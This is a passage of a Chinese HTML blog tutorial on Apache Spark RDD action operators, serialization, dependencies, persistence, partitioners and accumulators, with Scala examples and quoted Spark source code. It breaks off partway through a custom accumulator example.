sparkContext.makeRDD(List((“a”,1),(“c”,2),(“c”,3)))</p><p>val value: RDD[(String, (Iterable[Int], Iterable[Int]))] = </p><p>dataRDD1.cogroup(dataRDD2)</p><h4 id="2-1-4-4-案例实操"><a href="#2-1-4-4-案例实操" class="headerlink" title="2.1.4.4 案例实操"></a>2.1.4.4 案例实操</h4><ol><li>数据准备</li></ol><p>agent.log：时间戳，省份，城市，用户，广告，中间字段使用空格分隔。</p><ol start="2"><li>需求描述</li></ol><p>统计出每一个省份每个广告被点击数量排行的Top3</p><ol start="3"><li><p>需求分析</p></li><li><p>功能实现</p></li></ol><h4 id="2-1-4-5-RDD行动算子"><a href="#2-1-4-5-RDD行动算子" class="headerlink" title="2.1.4.5 RDD行动算子"></a>2.1.4.5 RDD行动算子</h4><h5 id="1-reduce"><a href="#1-reduce" class="headerlink" title="1)   reduce"></a>1)   reduce</h5><p>Ø 函数签名</p><p>def reduce(f: (T, T) =&gt; T): T</p><p>Ø 函数说明</p><p><strong>聚集RDD中的所有元素，先聚合分区内数据，再聚合分区间数据</strong></p><p>val rdd: RDD[Int] = sc.makeRDD(List(1,2,3,4))</p><p>// 聚合数据</p><p>val reduceResult: Int = rdd.reduce(<em>+</em>)</p><h5 id="2-collect"><a href="#2-collect" class="headerlink" title="2)   collect"></a>2)   collect</h5><p>Ø 函数签名</p><p>def collect(): Array[T]</p><p>Ø 函数说明</p><p>在驱动程序（Driver）中，以数组Array的形式返回数据集的所有元素</p><p>val rdd: RDD[Int] = sc.makeRDD(List(1,2,3,4))</p><p>// 收集数据到Driver</p><p>rdd.collect().foreach(println)</p><h5 id="3-count"><a href="#3-count" class="headerlink" title="3)   count"></a>3)   count</h5><p>Ø 函数签名</p><p>def count(): Long</p><p>Ø 函数说明</p><p>返回RDD中元素的个数</p><p>val rdd: RDD[Int] = sc.makeRDD(List(1,2,3,4))</p><p>// 返回RDD中元素的个数</p><p>val countResult: Long = rdd.count()</p><h5 id="4-first"><a href="#4-first" class="headerlink" title="4)   first"></a>4)   first</h5><p>Ø 函数签名</p><p>def first(): T</p><p>Ø 函数说明</p><p>返回RDD中的第一个元素</p><p>val rdd: RDD[Int] = sc.makeRDD(List(1,2,3,4))</p><p>// 返回RDD中元素的个数</p><p>val firstResult: Int = rdd.first()</p><p>println(firstResult)</p><h5 id="5-take"><a href="#5-take" class="headerlink" title="5)   take"></a>5)   take</h5><p>Ø 函数签名</p><p>def take(num: Int): Array[T]</p><p>Ø 函数说明</p><p>返回一个由RDD的前n个元素组成的数组</p><p>vval rdd: RDD[Int] = sc.makeRDD(List(1,2,3,4))</p><p>// 返回RDD中元素的个数</p><p>val takeResult: Array[Int] = rdd.take(2)</p><p>println(takeResult.mkString(“,”))</p><h5 id="6-takeOrdered"><a href="#6-takeOrdered" class="headerlink" title="6)   takeOrdered"></a>6)   takeOrdered</h5><p>Ø 函数签名</p><p>def takeOrdered(num: Int)(implicit ord: Ordering[T]): Array[T]</p><p>Ø 函数说明</p><p>返回该RDD排序后的前n个元素组成的数组</p><p>val rdd: RDD[Int] = sc.makeRDD(List(1,3,2,4))</p><p>// 返回RDD中元素的个数</p><p>val result: Array[Int] = rdd.takeOrdered(2)</p><h5 id="7-aggregate"><a href="#7-aggregate" class="headerlink" title="7)   aggregate"></a>7)   aggregate</h5><p>Ø 函数签名</p><p>def aggregate[U: ClassTag](zeroValue: U)(seqOp: (U, T) =&gt; U, combOp: (U, U) =&gt; U): U</p><p>Ø 函数说明</p><p>分区的数据通过初始值和分区内的数据进行聚合，然后再和初始值进行分区间的数据聚合</p><p>val rdd: RDD[Int] = sc.makeRDD(List(1, 2, 3, 4), 8)</p><p>// 将该RDD所有元素相加得到结果</p><p>//val result: Int = rdd.aggregate(0)(_ + _, _ + _)</p><p>val result: Int = rdd.aggregate(10)(_ + _, _ + _)</p><h5 id="8-fold"><a href="#8-fold" class="headerlink" title="8)   fold"></a>8)   fold</h5><p>Ø 函数签名</p><p>def fold(zeroValue: T)(op: (T, T) =&gt; T): T</p><p>Ø 函数说明</p><p>折叠操作，aggregate的简化版操作</p><p>val rdd: RDD[Int] = sc.makeRDD(List(1, 2, 3, 4))</p><p>val foldResult: Int = rdd.fold(0)(<em>+</em>)</p><h5 id="9-countByKey"><a href="#9-countByKey" class="headerlink" title="9)   countByKey"></a>9)   countByKey</h5><p>Ø 函数签名</p><p>def countByKey(): Map[K, Long]</p><p>Ø 函数说明</p><p>统计每种key的个数</p><p>val rdd: RDD[(Int, String)] = sc.makeRDD(List((1, “a”), (1, “a”), (1, “a”), (2, “b”), (3, “c”), (3, “c”)))</p><p>// 统计每种key的个数</p><p>val result: collection.Map[Int, Long] = rdd.countByKey()</p><h5 id="10-save相关算子"><a href="#10-save相关算子" class="headerlink" title="10)  save相关算子"></a>10)  save相关算子</h5><p>Ø 函数签名</p><p>def saveAsTextFile(path: String): Unit</p><p>def saveAsObjectFile(path: String): Unit</p><p>def saveAsSequenceFile(</p><p> path: String,</p><p> codec: Option[Class[_ &lt;: CompressionCodec]] = None): Unit</p><p>Ø 函数说明</p><p>将数据保存到不同格式的文件中</p><p>// 保存成Text文件</p><p>rdd.saveAsTextFile(“output”)</p><p>// 序列化成对象保存到文件</p><p>rdd.saveAsObjectFile(“output1”)</p><p>// 保存成Sequencefile文件</p><p>rdd.map((_,1)).saveAsSequenceFile(“output2”)</p><h5 id="11-foreach"><a href="#11-foreach" class="headerlink" title="11)  foreach"></a>11)  foreach</h5><p>Ø 函数签名</p><p>def foreach(f: T =&gt; Unit): Unit = withScope {</p><p>  val cleanF = sc.clean(f)</p><p>  sc.runJob(this, (iter: Iterator[T]) =&gt; iter.foreach(cleanF))</p><p>}</p><p>Ø 函数说明</p><p>分布式遍历RDD中的每一个元素，调用指定函数</p><p>val rdd: RDD[Int] = sc.makeRDD(List(1,2,3,4))</p><p>// 收集后打印</p><p>rdd.map(num=&gt;num).collect().foreach(println)</p><p>println(“<strong><strong><strong>****</strong></strong></strong>“)</p><p>// 分布式打印</p><p>rdd.foreach(println)</p><h4 id="2-1-4-6-RDD序列化"><a href="#2-1-4-6-RDD序列化" class="headerlink" title="2.1.4.6 RDD序列化"></a>2.1.4.6 RDD序列化</h4><ol><li>闭包检查</li></ol><p>从计算的角度, 算子以外的代码都是在Driver端执行, 算子里面的代码都是在Executor端执行。那么在scala的函数式编程中，就会导致算子内经常会用到算子外的数据，这样就形成了闭包的效果，如果使用的算子外的数据无法序列化，就意味着无法传值给Executor端执行，就会发生错误，所以需要在执行任务计算前，检测闭包内的对象是否可以进行序列化，这个操作我们称之为闭包检测。Scala2.12版本后闭包编译方式发生了改变</p><ol start="2"><li>序列化方法和属性</li></ol><p>从计算的角度, 算子以外的代码都是在Driver端执行, 算子里面的代码都是在Executor端执行，看如下代码：</p><p>object serializable02_function {</p><p>  def main(args: Array[String]): Unit = {</p><p>​    //1.创建SparkConf并设置App名称</p><p>​    val conf: SparkConf = new SparkConf().setAppName(“SparkCoreTest”).setMaster(“local[*]”)</p><p>​    //2.创建SparkContext，该对象是提交Spark App的入口</p><p>​    val sc: SparkContext = new SparkContext(conf)</p><p>​    //3.创建一个RDD</p><p>​    val rdd: RDD[String] = sc.makeRDD(Array(“hello world”, “hello spark”, “hive”, “atguigu”))</p><p>​    //3.1创建一个Search对象</p><p>​    val search = new Search(“hello”)</p><p>​    //3.2 函数传递，打印：ERROR Task not serializable</p><p>​    search.getMatch1(rdd).collect().foreach(println)</p><p>​    //3.3 属性传递，打印：ERROR Task not serializable</p><p>​    search.getMatch2(rdd).collect().foreach(println)</p><p>​    //4.关闭连接</p><p>​    sc.stop()</p><p>  }</p><p>}</p><p>class Search(query:String) extends Serializable {</p><p>  def isMatch(s: String): Boolean = {</p><p>​    s.contains(query)</p><p>  }</p><p>  // 函数序列化案例</p><p>  def getMatch1 (rdd: RDD[String]): RDD[String] = {</p><p>​    //rdd.filter(this.isMatch)</p><p>​    rdd.filter(isMatch)</p><p>  }</p><p>  // 属性序列化案例</p><p>  def getMatch2(rdd: RDD[String]): RDD[String] = {</p><p>​    //rdd.filter(x =&gt; x.contains(this.query))</p><p>​    rdd.filter(x =&gt; x.contains(query))</p><p>​    //val q = query</p><p>​    //rdd.filter(x =&gt; x.contains(q))</p><p>  }</p><p>}</p><ol start="3"><li>Kryo序列化框架</li></ol><p>参考地址: <a href="https://github.com/EsotericSoftware/kryo">https://github.com/EsotericSoftware/kryo</a></p><p>Java的序列化能够序列化任何的类。但是比较重（字节多），序列化后，对象的提交也比较大。Spark出于性能的考虑，Spark2.0开始支持另外一种Kryo序列化机制。Kryo速度是Serializable的10倍。当RDD在Shuffle数据的时候，简单数据类型、数组和字符串类型已经在Spark内部使用Kryo来序列化。</p><p>注意：即使使用Kryo序列化，也要继承Serializable接口。</p><p>object serializable_Kryo {</p><p>  def main(args: Array[String]): Unit = {</p><p>​    val conf: SparkConf = new SparkConf()</p><p>​        .setAppName(“SerDemo”)</p><p>​        .setMaster(“local[*]”)</p><p>​        // 替换默认的序列化机制</p><p>​        .set(“spark.serializer”, “org.apache.spark.serializer.KryoSerializer”)</p><p>​        // 注册需要使用 kryo 序列化的自定义类</p><p>​        .registerKryoClasses(Array(classOf[Searcher]))</p><p>​    val sc = new SparkContext(conf)</p><p>​    val rdd: RDD[String] = sc.makeRDD(Array(“hello world”, “hello atguigu”, “atguigu”, “hahah”), 2)</p><p>​    val searcher = new Searcher(“hello”)</p><p>​    val result: RDD[String] = searcher.getMatchedRDD1(rdd)</p><p>​    result.collect.foreach(println)</p><p>  }</p><p>}</p><p>case class Searcher(val query: String) {</p><p>  def isMatch(s: String) = {</p><p>​    s.contains(query)</p><p>  }</p><p>  def getMatchedRDD1(rdd: RDD[String]) = {</p><p>​    rdd.filter(isMatch) </p><p>  }</p><p>  def getMatchedRDD2(rdd: RDD[String]) = {</p><p>​    val q = query</p><p>​    rdd.filter(_.contains(q))</p><p>  }</p><p>}</p><h4 id="2-1-4-7-RDD依赖关系"><a href="#2-1-4-7-RDD依赖关系" class="headerlink" title="2.1.4.7 RDD依赖关系"></a>2.1.4.7 RDD依赖关系</h4><ol><li>RDD 血缘关系</li></ol><p>RDD只支持粗粒度转换，即在大量记录上执行的单个操作。将创建RDD的一系列Lineage（血统）记录下来，以便恢复丢失的分区。RDD的Lineage会记录RDD的元数据信息和转换行为，当该RDD的部分分区数据丢失时，它可以根据这些信息来重新运算和恢复丢失的数据分区。</p><p>val fileRDD: RDD[String] = sc.textFile(“input/1.txt”)</p><p>println(fileRDD.toDebugString)</p><p>println(“———————-“)</p><p>val wordRDD: RDD[String] = fileRDD.flatMap(_.split(“ “))</p><p>println(wordRDD.toDebugString)</p><p>println(“———————-“)</p><p>val mapRDD: RDD[(String, Int)] = wordRDD.map((_,1))</p><p>println(mapRDD.toDebugString)</p><p>println(“———————-“)</p><p>val resultRDD: RDD[(String, Int)] = mapRDD.reduceByKey(<em>+</em>)</p><p>println(resultRDD.toDebugString)</p><p>resultRDD.collect()</p><ol start="2"><li>RDD 依赖关系</li></ol><p>这里所谓的依赖关系，其实就是两个相邻RDD之间的关系</p><p>val sc: SparkContext = new SparkContext(conf)</p><p>val fileRDD: RDD[String] = sc.textFile(“input/1.txt”)</p><p>println(fileRDD.dependencies)</p><p>println(“———————-“)</p><p>val wordRDD: RDD[String] = fileRDD.flatMap(_.split(“ “))</p><p>println(wordRDD.dependencies)</p><p>println(“———————-“)</p><p>val mapRDD: RDD[(String, Int)] = wordRDD.map((_,1))</p><p>println(mapRDD.dependencies)</p><p>println(“———————-“)</p><p>val resultRDD: RDD[(String, Int)] = mapRDD.reduceByKey(<em>+</em>)</p><p>println(resultRDD.dependencies)</p><p>resultRDD.collect()</p><ol start="3"><li>RDD 窄依赖</li></ol><p>窄依赖表示每一个父(上游)RDD的Partition最多被子（下游）RDD的一个Partition使用，窄依赖我们形象的比喻为独生子女。</p><p>class OneToOneDependency[T](rdd: RDD[T]) extends NarrowDependency<a href="rdd">T</a> </p><ol start="4"><li>RDD 宽依赖</li></ol><p>宽依赖表示同一个父（上游）RDD的Partition被多个子（下游）RDD的Partition依赖，会引起Shuffle，总结：宽依赖我们形象的比喻为多生。</p><p>class ShuffleDependency[K: ClassTag, V: ClassTag, C: ClassTag](</p><p>  @transient private val <em>rdd: RDD[</em> &lt;: Product2[K, V]],</p><p>  val partitioner: Partitioner,</p><p>  val serializer: Serializer = SparkEnv.get.serializer,</p><p>  val keyOrdering: Option[Ordering[K]] = None,</p><p>  val aggregator: Option[Aggregator[K, V, C]] = None,</p><p>  val mapSideCombine: Boolean = false)</p><p> extends Dependency[Product2[K, V]] </p><ol start="5"><li>RDD 阶段划分</li></ol><p>DAG（Directed Acyclic Graph）有向无环图是由点和线组成的拓扑图形，该图形具有方向，不会闭环。例如，DAG记录了RDD的转换过程和任务的阶段。</p><p><img src="/2020/11/29/bigdata-Spark2-framework/clip_image113.jpg" alt="img">    <img src="file:///C:/Users/MENGLI~1.ZHA/AppData/Local/Temp/msohtmlclip1/01/clip_image115.jpg" alt="img">   <img src="file:///C:/Users/MENGLI~1.ZHA/AppData/Local/Temp/msohtmlclip1/01/clip_image117.jpg" alt="img"></p><ol start="6"><li>RDD 阶段划分源码</li></ol><p>try {</p><p> // New stage creation may throw an exception if, for example, jobs are run on a</p><p> // HadoopRDD whose underlying HDFS files have been deleted.</p><p> finalStage = createResultStage(finalRDD, func, partitions, jobId, callSite)</p><p>} catch {</p><p> case e: Exception =&gt;</p><p>  logWarning(“Creating new stage failed due to exception - job: “ + jobId, e)</p><p>  listener.jobFailed(e)</p><p>  return</p><p>}</p><p>……</p><p>private def createResultStage(</p><p> rdd: RDD[_],</p><p> func: (TaskContext, Iterator[_]) =&gt; _,</p><p> partitions: Array[Int],</p><p> jobId: Int,</p><p> callSite: CallSite): ResultStage = {</p><p>val parents = getOrCreateParentStages(rdd, jobId)</p><p>val id = nextStageId.getAndIncrement()</p><p>val stage = new ResultStage(id, rdd, func, partitions, parents, jobId, callSite)</p><p>stageIdToStage(id) = stage</p><p>updateJobIdStageIdMaps(jobId, stage)</p><p>stage</p><p>}</p><p>……</p><p>private def getOrCreateParentStages(rdd: RDD[_], firstJobId: Int): List[Stage] = {</p><p>getShuffleDependencies(rdd).map { shuffleDep =&gt;</p><p> getOrCreateShuffleMapStage(shuffleDep, firstJobId)</p><p>}.toList</p><p>}</p><p>……</p><p>private[scheduler] def getShuffleDependencies(</p><p> rdd: RDD[<em>]): HashSet[ShuffleDependency[</em>, _, _]] = {</p><p>val parents = new HashSet[ShuffleDependency[_, _, _]]</p><p>val visited = new HashSet[RDD[_]]</p><p>val waitingForVisit = new Stack[RDD[_]]</p><p>waitingForVisit.push(rdd)</p><p>while (waitingForVisit.nonEmpty) {</p><p> val toVisit = waitingForVisit.pop()</p><p> if (!visited(toVisit)) {</p><p>  visited += toVisit</p><p>  toVisit.dependencies.foreach {</p><p>   case shuffleDep: ShuffleDependency[_, _, _] =&gt;</p><p>​     parents += shuffleDep</p><p>   case dependency =&gt;</p><p>​    waitingForVisit.push(dependency.rdd)</p><p>  }</p><p> }</p><p>}</p><p>parents</p><p>}</p><ol start="7"><li>RDD 任务划分</li></ol><p>RDD任务切分中间分为：Application、Job、Stage和Task</p><p>l Application：初始化一个SparkContext即生成一个Application；</p><p>l Job：一个Action算子就会生成一个Job；</p><p>l Stage：Stage等于宽依赖(ShuffleDependency)的个数加1；</p><p>l Task：一个Stage阶段中，最后一个RDD的分区个数就是Task的个数。</p><p>注意：Application-&gt;Job-&gt;Stage-&gt;Task每一层都是1对n的关系。 </p><p><img src="/2020/11/29/bigdata-Spark2-framework/clip_image119.gif" alt="img"></p><ol start="8"><li>RDD 任务划分源码</li></ol><p>val tasks: Seq[Task[_]] = try {</p><p> stage match {</p><p>  case stage: ShuffleMapStage =&gt;</p><p>   partitionsToCompute.map { id =&gt;</p><p>​    val locs = taskIdToLocations(id)</p><p>​    val part = stage.rdd.partitions(id)</p><p>​    new ShuffleMapTask(stage.id, stage.latestInfo.attemptId,</p><p>​     taskBinary, part, locs, stage.latestInfo.taskMetrics, properties, Option(jobId),</p><p>​     Option(sc.applicationId), sc.applicationAttemptId)</p><p>   }</p><p>  case stage: ResultStage =&gt;</p><p>   partitionsToCompute.map { id =&gt;</p><p>​    val p: Int = stage.partitions(id)</p><p>​    val part = stage.rdd.partitions(p)</p><p>​    val locs = taskIdToLocations(id)</p><p>​    new ResultTask(stage.id, stage.latestInfo.attemptId,</p><p>​     taskBinary, part, locs, id, properties, stage.latestInfo.taskMetrics,</p><p>​     Option(jobId), Option(sc.applicationId), sc.applicationAttemptId)</p><p>   }</p><p> }</p><p>……</p><p>val partitionsToCompute: Seq[Int] = stage.findMissingPartitions()</p><p>……</p><p>override def findMissingPartitions(): Seq[Int] = {</p><p>mapOutputTrackerMaster</p><p> .findMissingPartitions(shuffleDep.shuffleId)</p><p> .getOrElse(0 until numPartitions)</p><p>}</p><h4 id="2-1-4-8-RDD持久化"><a href="#2-1-4-8-RDD持久化" class="headerlink" title="2.1.4.8 RDD持久化"></a>2.1.4.8 RDD持久化</h4><ol><li>RDD Cache缓存</li></ol><p>RDD通过Cache或者Persist方法将前面的计算结果缓存，默认情况下会把数据以缓存在JVM的堆内存中。但是并不是这两个方法被调用时立即缓存，而是触发后面的action算子时，该RDD将会被缓存在计算节点的内存中，并供后面重用。</p><p>// cache操作会增加血缘关系，不改变原有的血缘关系</p><p>println(wordToOneRdd.toDebugString)</p><p>// 数据缓存。</p><p>wordToOneRdd.cache()</p><p>// 可以更改存储级别</p><p>//mapRdd.persist(StorageLevel.MEMORY_AND_DISK_2)</p><p>存储级别</p><p>object StorageLevel {</p><p> val NONE = new StorageLevel(false, false, false, false)</p><p> val DISK_ONLY = new StorageLevel(true, false, false, false)</p><p> val DISK_ONLY_2 = new StorageLevel(true, false, false, false, 2)</p><p> val MEMORY_ONLY = new StorageLevel(false, true, false, true)</p><p> val MEMORY_ONLY_2 = new StorageLevel(false, true, false, true, 2)</p><p> val MEMORY_ONLY_SER = new StorageLevel(false, true, false, false)</p><p> val MEMORY_ONLY_SER_2 = new StorageLevel(false, true, false, false, 2)</p><p> val MEMORY_AND_DISK = new StorageLevel(true, true, false, true)</p><p> val MEMORY_AND_DISK_2 = new StorageLevel(true, true, false, true, 2)</p><p> val MEMORY_AND_DISK_SER = new StorageLevel(true, true, false, false)</p><p> val MEMORY_AND_DISK_SER_2 = new StorageLevel(true, true, false, false, 2)</p><p> val OFF_HEAP = new StorageLevel(true, true, true, false, 1)</p><p><img src="/2020/11/29/bigdata-Spark2-framework/clip_image121.gif" alt="img"></p><p>缓存有可能丢失，或者存储于内存的数据由于内存不足而被删除，RDD的缓存容错机制保证了即使缓存丢失也能保证计算的正确执行。通过基于RDD的一系列转换，丢失的数据会被重算，由于RDD的各个Partition是相对独立的，因此只需要计算丢失的部分即可，并不需要重算全部Partition。</p><p>Spark会自动对一些Shuffle操作的中间数据做持久化操作(比如：reduceByKey)。这样做的目的是为了当一个节点Shuffle失败了避免重新计算整个输入。但是，在实际使用的时候，如果想重用数据，仍然建议调用persist或cache。</p><ol start="2"><li>RDD CheckPoint检查点</li></ol><p>所谓的检查点其实就是通过将RDD中间结果写入磁盘</p><p>由于血缘依赖过长会造成容错成本过高，这样就不如在中间阶段做检查点容错，如果检查点之后有节点出现问题，可以从检查点开始重做血缘，减少了开销。</p><p>对RDD进行checkpoint操作并不会马上被执行，必须执行Action操作才能触发。</p><p>// 设置检查点路径</p><p>sc.setCheckpointDir(“./checkpoint1”)</p><p>// 创建一个RDD，读取指定位置文件:hello atguigu atguigu</p><p>val lineRdd: RDD[String] = sc.textFile(“input/1.txt”)</p><p>// 业务逻辑</p><p>val wordRdd: RDD[String] = lineRdd.flatMap(line =&gt; line.split(“ “))</p><p>val wordToOneRdd: RDD[(String, Long)] = wordRdd.map {</p><p>  word =&gt; {</p><p>​    (word, System.currentTimeMillis())</p><p>  }</p><p>}</p><p>// 增加缓存,避免再重新跑一个job做checkpoint</p><p>wordToOneRdd.cache()</p><p>// 数据检查点：针对wordToOneRdd做检查点计算</p><p>wordToOneRdd.checkpoint()</p><p>// 触发执行逻辑</p><p>wordToOneRdd.collect().foreach(println)</p><ol start="3"><li>缓存和检查点区别</li></ol><p>1）Cache缓存只是将数据保存起来，不切断血缘依赖。Checkpoint检查点切断血缘依赖。</p><p>2）Cache缓存的数据通常存储在磁盘、内存等地方，可靠性低。Checkpoint的数据通常存储在HDFS等容错、高可用的文件系统，可靠性高。</p><p>3）建议对checkpoint()的RDD使用Cache缓存，这样checkpoint的job只需从Cache缓存中读取数据即可，否则需要再从头计算一次RDD。</p><h4 id="2-1-4-9-RDD分区器"><a href="#2-1-4-9-RDD分区器" class="headerlink" title="2.1.4.9 RDD分区器"></a>2.1.4.9 RDD分区器</h4><p>Spark目前支持Hash分区和Range分区，和用户自定义分区。Hash分区为当前的默认分区。分区器直接决定了RDD中分区的个数、RDD中每条数据经过Shuffle后进入哪个分区，进而决定了Reduce的个数。</p><p>Ø 只有Key-Value类型的RDD才有分区器，非Key-Value类型的RDD分区的值是None</p><p>Ø 每个RDD的分区ID范围：0 ~ (numPartitions - 1)，决定这个值是属于那个分区的。</p><ol><li>Hash分区：对于给定的key，计算其hashCode,并除以分区个数取余</li></ol><p>class HashPartitioner(partitions: Int) extends Partitioner {</p><p> require(partitions &gt;= 0, s”Number of partitions ($partitions) cannot be negative.”)</p><p> def numPartitions: Int = partitions</p><p> def getPartition(key: Any): Int = key match {</p><p>  case null =&gt; 0</p><p>  case _ =&gt; Utils.nonNegativeMod(key.hashCode, numPartitions)</p><p> }</p><p> override def equals(other: Any): Boolean = other match {</p><p>  case h: HashPartitioner =&gt;</p><p>   h.numPartitions == numPartitions</p><p>  case _ =&gt;</p><p>   false</p><p> }</p><p> override def hashCode: Int = numPartitions</p><p>}</p><ol start="2"><li>Range分区：将一定范围内的数据映射到一个分区中，尽量保证每个分区数据均匀，而且分区间有序</li></ol><p>class RangePartitioner[K : Ordering : ClassTag, V](</p><p>  partitions: Int,</p><p>  rdd: RDD[_ &lt;: Product2[K, V]],</p><p>  private var ascending: Boolean = true)</p><p> extends Partitioner {</p><p> // We allow partitions = 0, which happens when sorting an empty RDD under the default settings.</p><p> require(partitions &gt;= 0, s”Number of partitions cannot be negative but found $partitions.”)</p><p> private var ordering = implicitly[Ordering[K]]</p><p> // An array of upper bounds for the first (partitions - 1) partitions</p><p> private var rangeBounds: Array[K] = {</p><p> …</p><p> }</p><p> def numPartitions: Int = rangeBounds.length + 1</p><p> private var binarySearch: ((Array[K], K) =&gt; Int) = CollectionsUtils.makeBinarySearch[K]</p><p> def getPartition(key: Any): Int = {</p><p>  val k = key.asInstanceOf[K]</p><p>   var partition = 0</p><p>  if (rangeBounds.length &lt;= 128) {</p><p>   // If we have less than 128 partitions naive search</p><p>​    while (partition &lt; rangeBounds.length &amp;&amp; ordering.gt(k, rangeBounds(partition))) {</p><p>​    partition += 1</p><p>   }</p><p>  } else {</p><p>   // Determine which binary search method to use only once.</p><p>   partition = binarySearch(rangeBounds, k)</p><p>   // binarySearch either returns the match location or -[insertion point]-1</p><p>   if (partition &lt; 0) {</p><p>​    partition = -partition-1</p><p>   }</p><p>   if (partition &gt; rangeBounds.length) {</p><p>​    partition = rangeBounds.length</p><p>   }</p><p>  }</p><p>  if (ascending) {</p><p>   partition</p><p>  } else {</p><p>   rangeBounds.length - partition</p><p>  }</p><p> }</p><p> override def equals(other: Any): Boolean = other match {</p><p> …</p><p> }</p><p> override def hashCode(): Int = {</p><p> …</p><p> }</p><p> @throws(classOf[IOException])</p><p> private def writeObject(out: ObjectOutputStream): Unit = Utils.tryOrIOException {</p><p> …</p><p> }</p><p> @throws(classOf[IOException])</p><p> private def readObject(in: ObjectInputStream): Unit = Utils.tryOrIOException {</p><p> …</p><p> }</p><p>}</p><h4 id="2-1-4-10-RDD文件读取与保存"><a href="#2-1-4-10-RDD文件读取与保存" class="headerlink" title="2.1.4.10 RDD文件读取与保存"></a>2.1.4.10 RDD文件读取与保存</h4><p>Spark的数据读取及数据保存可以从两个维度来作区分：文件格式以及文件系统。</p><p>文件格式分为：text文件、csv文件、sequence文件以及Object文件；</p><p>文件系统分为：本地文件系统、HDFS、HBASE以及数据库。</p><p>Ø text文件</p><p>// 读取输入文件</p><p>val inputRDD: RDD[String] = sc.textFile(“input/1.txt”)</p><p>// 保存数据</p><p>inputRDD.saveAsTextFile(“output”)</p><p>Ø sequence文件</p><p>SequenceFile文件是<a href="http://lib.csdn.net/base/hadoop">Hadoop</a>用来存储二进制形式的key-value对而设计的一种平面文件(Flat File)。在SparkContext中，可以调用sequenceFile<a href="path">keyClass, valueClass</a>。</p><p>// 保存数据为SequenceFile</p><p>dataRDD.saveAsSequenceFile(“output”)</p><p>// 读取SequenceFile文件</p><p>sc.sequenceFile<a href="%22output%22">Int,Int</a>.collect().foreach(println)</p><p>Ø object对象文件</p><p>对象文件是将对象序列化后保存的文件，采用Java的序列化机制。可以通过objectFile<a href="path">T: ClassTag</a>函数接收一个路径，读取对象文件，返回对应的RDD，也可以通过调用saveAsObjectFile()实现对对象文件的输出。因为是序列化所以要指定类型。</p><p>// 保存数据</p><p>dataRDD.saveAsObjectFile(“output”)</p><p>// 读取数据</p><p>sc.objectFile<a href="%22output%22">Int</a>.collect().foreach(println)</p><h2 id="2-2-累加器"><a href="#2-2-累加器" class="headerlink" title="2.2 累加器"></a>2.2 累加器</h2><h3 id="2-2-1-实现原理"><a href="#2-2-1-实现原理" class="headerlink" title="2.2.1 实现原理"></a>2.2.1 实现原理</h3><p>累加器用来把Executor端变量信息聚合到Driver端。在Driver程序中定义的变量，在Executor端的每个Task都会得到这个变量的一份新的副本，每个task更新这些副本的值后，传回Driver端进行merge。</p><h3 id="2-2-2-基础编程"><a href="#2-2-2-基础编程" class="headerlink" title="2.2.2 基础编程"></a>2.2.2 基础编程</h3><h4 id="2-2-2-1-系统累加器"><a href="#2-2-2-1-系统累加器" class="headerlink" title="2.2.2.1 系统累加器"></a>2.2.2.1 系统累加器</h4><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> rdd <span class="token operator">=</span> sc<span class="token punctuation">.</span>makeRDD<span class="token punctuation">(</span>List<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 声明累加器</span><span class="token keyword">var</span> sum <span class="token operator">=</span> sc<span class="token punctuation">.</span>longAccumulator<span class="token punctuation">(</span><span class="token string">"sum"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>rdd<span class="token punctuation">.</span>foreach<span class="token punctuation">(</span>  num <span class="token keyword">=></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 使用累加器</span>    sum<span class="token punctuation">.</span>add<span class="token punctuation">(</span>num<span class="token punctuation">)</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 获取累加器的值</span>println<span class="token punctuation">(</span><span class="token string">"sum = "</span> <span class="token operator">+</span> sum<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-2-2-自定义累加器"><a href="#2-2-2-2-自定义累加器" class="headerlink" title="2.2.2.2 自定义累加器"></a>2.2.2.2 自定义累加器</h4><pre class="line-numbers language-scala"><code class="language-scala"><span class="token comment" spellcheck="true">// 自定义累加器</span><span class="token comment" spellcheck="true">// 1. 继承AccumulatorV2，并设定泛型</span><span class="token comment" spellcheck="true">// 2. 重写累加器的抽象方法</span><span class="token keyword">class</span> WordCountAccumulator <span class="token keyword">extends</span> AccumulatorV2<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">,</span> mutable<span class="token punctuation">.</span>Map<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token builtin">Long</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">var</span> map <span class="token operator">:</span> mutable<span class="token punctuation">.</span>Map<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token builtin">Long</span><span class="token punctuation">]</span> <span class="token operator">=</span> mutable<span class="token punctuation">.</span>Map<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 累加器是否为初始状态</span><span class="token keyword">override</span> <span class="token keyword">def</span> isZero<span class="token operator">:</span> <span class="token builtin">Boolean</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  map<span class="token punctuation">.</span>isEmpty<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 复制累加器</span><span class="token keyword">override</span> <span class="token keyword">def</span> copy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> AccumulatorV2<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">,</span> mutable<span class="token punctuation">.</span>Map<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token builtin">Long</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span 